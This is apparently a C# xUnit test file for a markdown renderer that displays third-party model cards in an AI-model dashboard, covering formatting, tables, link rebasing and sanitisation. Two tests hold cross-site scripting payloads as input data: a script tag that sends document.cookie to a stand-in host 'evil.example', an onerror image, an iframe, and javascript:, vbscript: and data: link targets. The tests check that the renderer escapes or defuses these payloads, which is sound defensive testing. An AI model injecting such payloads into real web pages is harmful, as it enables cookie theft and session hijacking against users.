using NetCoreAI.Dashboard.Rendering;
using Xunit;

namespace NetCoreAI.Integration.Tests;

/// <summary>
/// Rendering a model card. The markdown comes from a stranger's repository, so what is stripped matters
/// as much as what is rendered.
/// </summary>
public class MarkdownRendererTests
{
    [Fact]
    public void Ordinary_markdown_renders()
    {
        var html = MarkdownRenderer.ToHtml("# Qwen2.5\n\nA **small** model with `tools`.\n\n- fast\n- permissive");

        Assert.Contains("<h1", html, StringComparison.Ordinal);
        Assert.Contains("<strong>small</strong>", html, StringComparison.Ordinal);
        Assert.Contains("<code>tools</code>", html, StringComparison.Ordinal);
        Assert.Contains("<li>fast</li>", html, StringComparison.Ordinal);
    }

    [Fact]
    public void Tables_render_because_model_cards_are_full_of_them()
    {
        var html = MarkdownRenderer.ToHtml("| Model | Size |\n|---|---|\n| 0.5B | 400 MB |");

        Assert.Contains("<table>", html, StringComparison.Ordinal);
        Assert.Contains("400 MB", html, StringComparison.Ordinal);
    }

    [Fact]
    public void Raw_html_in_a_model_card_is_not_passed_through()
    {
        var html = MarkdownRenderer.ToHtml("""
            # Model

            <script>fetch('https://evil.example/'+document.cookie)</script>
            <img src=x onerror="alert(1)">
            <iframe src="https://evil.example"></iframe>
            """);

        // A model card is third-party markdown reaching a dashboard that manages models and secrets.
        // The markup is escaped rather than dropped, so it shows as text and executes nothing: what must
        // not appear is an actual tag or attribute, not the letters that spell one.
        Assert.DoesNotContain("<script", html, StringComparison.OrdinalIgnoreCase);
        Assert.DoesNotContain("<iframe", html, StringComparison.OrdinalIgnoreCase);
        Assert.DoesNotContain("<img", html, StringComparison.OrdinalIgnoreCase);
        Assert.DoesNotContain("onerror=\"", html, StringComparison.OrdinalIgnoreCase);
        Assert.Contains("&lt;script", html, StringComparison.Ordinal);
    }

    [Theory]
    [InlineData("[click me](javascript:alert(1))")]
    [InlineData("[click me](JavaScript:alert(1))")]
    [InlineData("[click me](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)")]
    [InlineData("[click me](vbscript:msgbox)")]
    public void A_link_that_could_execute_is_defused(string markdown)
    {
        var html = MarkdownRenderer.ToHtml(markdown);

        // Stripping raw HTML does not cover this: a markdown link target is attacker-controlled too.
        Assert.DoesNotContain("javascript:", html, StringComparison.OrdinalIgnoreCase);
        Assert.DoesNotContain("vbscript:", html, StringComparison.OrdinalIgnoreCase);
        Assert.DoesNotContain("data:text/html", html, StringComparison.OrdinalIgnoreCase);
        Assert.Contains("href=\"#\"", html, StringComparison.Ordinal);
    }

    [Fact]
    public void Ordinary_schemes_still_work()
    {
        var html = MarkdownRenderer.ToHtml("[site](https://example.com) [mail](mailto:a@example.com)");

        Assert.Contains("https://example.com", html, StringComparison.Ordinal);
        Assert.Contains("mailto:a@example.com", html, StringComparison.Ordinal);
    }

    [Fact]
    public void Relative_images_and_links_are_rebased_on_the_repository()
    {
        var html = MarkdownRenderer.ToHtml(
            "![chart](assets/benchmark.png)\n\n[licence](LICENSE)",
            "https://huggingface.co/acme/model/resolve/main");

        Assert.Contains("https://huggingface.co/acme/model/resolve/main/assets/benchmark.png", html, StringComparison.Ordinal);
        Assert.Contains("https://huggingface.co/acme/model/resolve/main/LICENSE", html, StringComparison.Ordinal);
    }

    [Fact]
    public void Absolute_links_and_anchors_are_left_alone()
    {
        var html = MarkdownRenderer.ToHtml(
            "[paper](https://arxiv.org/abs/2407.10671) and [top](#overview)",
            "https://huggingface.co/acme/model/resolve/main");

        Assert.Contains("https://arxiv.org/abs/2407.10671", html, StringComparison.Ordinal);
        Assert.Contains("\"#overview\"", html, StringComparison.Ordinal);
        Assert.DoesNotContain("resolve/main/https", html, StringComparison.Ordinal);
    }

    [Fact]
    public void Nothing_in_means_nothing_out()
    {
        Assert.Equal(string.Empty, MarkdownRenderer.ToHtml(null));
        Assert.Equal(string.Empty, MarkdownRenderer.ToHtml("   "));
    }
}
